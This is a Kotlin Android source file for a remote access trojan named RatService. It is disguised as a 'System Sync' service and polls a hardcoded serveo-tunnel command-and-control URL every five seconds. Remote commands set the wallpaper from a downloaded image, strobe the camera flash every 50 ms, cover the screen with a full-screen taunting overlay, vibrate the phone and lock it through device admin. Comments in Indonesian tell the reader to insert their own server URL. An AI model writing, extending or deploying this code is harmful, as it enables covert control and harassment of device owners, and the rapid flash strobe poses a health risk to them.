package com.system.sync

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.BitmapFactory
import android.graphics.Color
import android.graphics.PixelFormat
import android.hardware.camera2.CameraManager
import android.os.*
import android.view.Gravity
import android.view.WindowManager
import android.widget.TextView
import kotlinx.coroutines.*
import okhttp3.*
import org.json.JSONObject
import java.io.InputStream
import java.util.concurrent.TimeUnit

// TAMBAHAN IMPORT BUAT FIX ERROR
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.app.WallpaperManager

class RatService : Service() {
    private val client = OkHttpClient.Builder().connectTimeout(10, TimeUnit.SECONDS).build()
    
    // GANTI URL SERVEO LO DI SINI
    private val c2Url = "https://699bd061f961ce84-103-26-188-26.serveousercontent.com"
    
    private val coroutineScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var deviceId = ""
    private var flashJob: Job? = null
    private var overlayView: TextView? = null
    private var windowManager: WindowManager? = null

    override fun onCreate() {
        super.onCreate()
        startForeground(1, createNotification())
        deviceId = "${Build.MANUFACTURER}_${Build.MODEL}".replace(" ", "_")
        windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        startPolling()
    }

    private fun startPolling() {
        coroutineScope.launch {
            while (isActive) {
                try {
                    val req = Request.Builder().url("$c2Url/poll?id=$deviceId").build()
                    client.newCall(req).execute().use { res ->
                        if (res.isSuccessful) {
                            val json = JSONObject(res.body?.string() ?: "{}")
                            val cmd = json.optString("cmd")
                            if (cmd.isNotEmpty()) executeCommand(cmd, json)
                        }
                    }
                } catch (e: Exception) {}
                delay(5000)
            }
        }
    }

    private fun executeCommand(cmd: String, payload: JSONObject) {
        when (cmd) {
            "SET_WALLPAPER" -> {
                val url = payload.optString("url")
                if (url.isNotEmpty()) downloadAndSetWallpaper(url)
            }
            "FLASHLIGHT_STROBE" -> {
                if (payload.optBoolean("enable", true)) startStrobe() else stopStrobe()
            }
            "SPAM_OVERLAY" -> {
                val text = payload.optString("text", "you're stupid")
                spamOverlay(text)
            }
            "VIBRATE" -> {
                vibrate(payload.optLong("duration", 5000L))
            }
            "LOCK_SCREEN" -> {
                lockScreen()
            }
        }
    }

    private fun downloadAndSetWallpaper(imageUrl: String) {
        coroutineScope.launch {
            try {
                val req = Request.Builder().url(imageUrl).build()
                client.newCall(req).execute().use { res ->
                    if (res.isSuccessful) {
                        val inputStream: InputStream? = res.body?.byteStream()
                        val bitmap = BitmapFactory.decodeStream(inputStream)
                        if (bitmap != null) {
                            val wm = WallpaperManager.getInstance(this@RatService)
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                                wm.setBitmap(bitmap, null, true, WallpaperManager.FLAG_SYSTEM)
                            } else {
                                wm.setBitmap(bitmap)
                            }
                        }
                        inputStream?.close()
                    }
                }
            } catch (e: Exception) {}
        }
    }

    private fun startStrobe() {
        flashJob?.cancel()
        flashJob = coroutineScope.launch {
            val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = cameraManager.cameraIdList[0]
            var state = false
            while (isActive) {
                try {
                    cameraManager.setTorchMode(cameraId, state)
                    state = !state
                } catch (e: Exception) {}
                delay(50)
            }
        }
    }

    private fun stopStrobe() {
        flashJob?.cancel()
        try {
            val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            cameraManager.setTorchMode(cameraManager.cameraIdList[0], false)
        } catch (e: Exception) {}
    }

    private fun spamOverlay(text: String) {
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        )
        overlayView = TextView(this).apply {
            this.text = text
            textSize = 40f
            setTextColor(Color.RED)
            setBackgroundColor(Color.BLACK)
            gravity = Gravity.CENTER
        }
        try {
            windowManager?.addView(overlayView, params)
        } catch (e: Exception) {}
    }

    private fun vibrate(duration: Long) {
        val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            vibrator.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE))
        } else {
            vibrator.vibrate(duration)
        }
    }

    private fun lockScreen() {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        // PASTIKAN IMPORT COMPONENTNAME ADA DI ATAS
        val admin = ComponentName(this, MyDeviceAdminReceiver::class.java)
        if (dpm.isAdminActive(admin)) {
            dpm.lockNow()
        }
    }

    private fun createNotification(): Notification {
        val channelId = "sys_sync"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "System Sync", NotificationManager.IMPORTANCE_LOW)
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(channel)
        }
        return Notification.Builder(this, channelId)
            .setContentTitle("System Sync")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
